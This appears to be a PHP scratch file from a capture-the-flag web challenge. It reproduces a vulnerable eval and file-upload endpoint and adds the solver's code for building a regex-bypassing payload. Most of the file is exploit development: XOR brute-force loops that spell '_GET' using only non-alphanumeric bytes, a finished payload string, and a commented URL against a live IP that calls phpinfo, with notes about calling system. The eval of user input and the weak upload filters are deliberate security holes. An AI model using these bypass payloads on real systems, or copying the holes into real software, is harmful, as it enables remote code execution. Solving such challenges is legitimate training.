<?php
function get_the_flag() {
	// webadmin will remove your upload file every 20 min!!!!
	$userdir = "upload/tmp_" . md5($_SERVER['REMOTE_ADDR']);
	if (!file_exists($userdir)) {
		mkdir($userdir);
	}
	if (!empty($_FILES["file"])) {
		$tmp_name = $_FILES["file"]["tmp_name"];
		$name = $_FILES["file"]["name"];

		$extension = substr($name, strrpos($name, ".") + 1);
		if (preg_match("/ph/i", $extension)) {
			die("^_^");
		}

		if (mb_strpos(file_get_contents($tmp_name), '<?') !== False) {
			die("^_^");
		}

		if (!exif_imagetype($tmp_name)) {
			die("^_^");
		}

		$path = $userdir . "/" . $name;
		@move_uploaded_file($tmp_name, $path);
		print_r($path);
	}
}

// if (!$hhh) {
// 	highlight_file(__FILE__);
// }

// for ($i = 0; $i < strlen($a); $i++) {
// 	echo ord($a[$i]) . "\r\n";
// }
// get_the_flag
// eval($_GET)
// $pl = 'h';
// $aa = "";
// $bb = "";
// $res = '';
$pl = "_GET";
for ($j = 0; $j < strlen($pl); $j++) {
	for ($i = 0xa0; $i < 0xff; $i++) {
		if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i)) == 0) {
			$t = chr($i) ^ $pl[$j];
			if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $t) == 0) {
				echo chr($i) . "-" . $t . " " . ord($t) . "\r\n";
				$aa .= chr($i);
				$bb .= $t;
				break;
			}
		}
	}
	echo str_replace("%", "\x", urlencode($aa) . "^" . urlencode($bb) . "\r\n");
}
// die();
//
function orstr($v) {
	for ($i = 33; $i < 127; $i++) {
		if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i)) == 0) {
			$t = chr($i) ^ $v;
			if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $t) == 0) {
				echo chr($i) . "-" . $t . " " . ord($t) . "\r\n";
			}
		}
	}
}
// orstr("]");
// $_GET[0] = "system";
// echo ${_GET}{0};
// echo "\r\n";
// $hhh = "\x25\x7D\x21\x7D^\x40\x0B\x40\x11";
// echo "@" ^ "\x1f";
// echo "\r\n";
// print_r(get_defined_functions());
//
// $hhh = @$_GET['_'];
//
// for ($i = 0; $i < 0xff; $i++) {
// 	if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i)) == 0) {
// 		echo chr($i) . ",";
// 	}
// }
//
//
// http://47.111.59.243:9001/?_=${%A0%A0%A0%A0^%FF%E7%E5%F4}{%A0}();&%A0=phpinfo
$hhh = "\xA0\xA0\xA0\xA0^\xFF\xE7\xE5\xF4;";
if (strlen($hhh) > 18) {
	die('One inch long, one inch strong!');
}
// ! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }
//
// 0-32,48-57,65-90,97-122,39,34,96,126,95,38,46,44,124,61,127
if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh, $m)) {
	print_r($m);
	die('Try something else!');
}

$character_type = count_chars($hhh, 3);
print_r("character_type : $character_type\r\n");
if (strlen($character_type) > 12) {
	die("Almost there!");
}
// error_reporting(0);
var_dump($hhh);
echo "\r\n\r\n";
eval("echo " . $hhh);
?>